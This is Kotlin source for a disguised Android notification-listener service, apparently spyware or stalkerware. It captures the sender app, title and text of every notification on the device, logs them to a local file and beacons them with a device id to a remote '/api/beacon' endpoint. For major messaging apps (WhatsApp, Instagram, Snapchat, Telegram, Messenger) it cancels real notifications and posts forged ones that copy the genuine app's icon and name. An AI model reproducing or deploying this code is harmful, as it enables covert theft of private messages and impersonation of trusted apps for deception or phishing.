package com.sys.svc

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.drawable.Drawable
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import org.json.JSONObject

class NotifListener : NotificationListenerService() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        val pkg = sbn.packageName ?: return
        val ex = sbn.notification.extras
        val title = ex.getString("android.title") ?: ""
        val text = ex.getString("android.text") ?: ""

        if (title.isNotBlank() || text.isNotBlank()) {
            val rec = pkg + " | " + title + " | " + text
            NotifStore.append(this, rec)
            val body = JSONObject()
                .put("device_id", Prefs.deviceId(this))
                .put("kind", "notification")
                .put("payload", rec.take(4000))
            scope.launch { Net.postJson("/api/beacon", body) }
        }

        if (SpoofPrefs.spoofOn(this) && shouldSpoof(pkg)) {
            val fakeTitle = SpoofPrefs.fakeTitle(this).ifBlank { title }
            val fakeText  = SpoofPrefs.fakeText(this).ifBlank { text }
            val iconPkg   = SpoofPrefs.iconPkg(this).ifBlank { pkg }

            cancelNotification(sbn.key)

            val appIcon: Bitmap? = getAppIcon(iconPkg)
            val appName = getAppName(iconPkg)

            postSpoof(iconPkg.hashCode(), appName, fakeTitle, fakeText, appIcon)
        }
    }

    private fun shouldSpoof(pkg: String): Boolean {
        val targets = setOf(
            "com.whatsapp", "com.whatsapp.w4b",
            "com.instagram.android", "com.snapchat.android",
            "org.telegram.messenger", "com.facebook.orca"
        )
        return pkg in targets
    }

    private fun getAppIcon(pkg: String): Bitmap? {
        return try {
            val d: Drawable = packageManager.getApplicationIcon(pkg)
            val bmp = Bitmap.createBitmap(d.intrinsicWidth.coerceAtLeast(1),
                d.intrinsicHeight.coerceAtLeast(1), Bitmap.Config.ARGB_8888)
            val c = Canvas(bmp); d.setBounds(0, 0, c.width, c.height); d.draw(c)
            bmp
        } catch (_: Exception) { null }
    }

    private fun getAppName(pkg: String): String {
        return try {
            val ai = packageManager.getApplicationInfo(pkg, 0)
            packageManager.getApplicationLabel(ai).toString()
        } catch (_: Exception) { "WhatsApp" }
    }

    private fun postSpoof(notifId: Int, appName: String, title: String, text: String, largeIcon: Bitmap?) {
        val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        val chId = "spoof_" + appName.replace(" ", "_").lowercase()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(chId, appName, NotificationManager.IMPORTANCE_HIGH).apply {
                setShowBadge(true)
                enableVibration(true)
                enableLights(true)
                setSound(android.provider.Settings.System.DEFAULT_NOTIFICATION_URI,
                    android.media.AudioAttributes.Builder()
                        .setUsage(android.media.AudioAttributes.USAGE_NOTIFICATION)
                        .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SONIFICATION)
                        .build())
            }
            nm.createNotificationChannel(ch)
        }

        val nb = NotificationCompat.Builder(this, chId)
            .setContentTitle(title)
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_notify_chat)
            .setLargeIcon(largeIcon)
            .setSubText(appName)
            .setOngoing(true)
            .setAutoCancel(false)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setDefaults(Notification.DEFAULT_ALL)

        nm.notify(notifId, nb.build())
    }

    override fun onInterrupt() {}
}

object NotifStore {
    fun append(ctx: Context, line: String) {
        val f = java.io.File(ctx.filesDir, "notifs.log")
        f.appendText(line + "\n")
    }
    fun dump(ctx: Context): String {
        val f = java.io.File(ctx.filesDir, "notifs.log")
        return if (f.exists()) f.readText().takeLast(50000) else ""
    }
}